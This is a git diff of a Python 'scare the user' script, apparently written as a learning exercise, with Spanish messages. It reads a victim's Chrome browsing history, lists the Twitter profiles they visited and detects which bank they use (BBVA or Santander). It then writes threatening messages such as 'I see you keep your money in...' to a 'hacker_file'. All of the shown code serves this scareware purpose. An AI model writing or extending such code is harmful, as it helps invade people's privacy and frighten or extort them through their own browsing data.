@@ -51,8 +51,19 @@ def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
         results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
         if results and results[0] not in ["notifications", "home"]:
             profiles_visited.append(results[0])                                 #.join une un iterable con un caracter
-    hacker_file.write("Ya vi que andas viendo los perfiles de {}...".format(", ".join(profiles_visited)))
+    hacker_file.write("Ya vi que andas viendo los perfiles de {}...\n".format(", ".join(profiles_visited)))
 
+def check_bank_account(hacker_file, chrome_history):
+    his_bank = None
+    banks = ["BBVA", "Santander"]
+    for item in chrome_history:
+        for b in banks:
+            if b.lower() in item[0].lower():
+                his_bank = b
+                break
+        if his_bank:
+            break
+    hacker_file.write("Ademas veo que guardas el dinero en {}...\n".format(his_bank))
 
 
 def main():
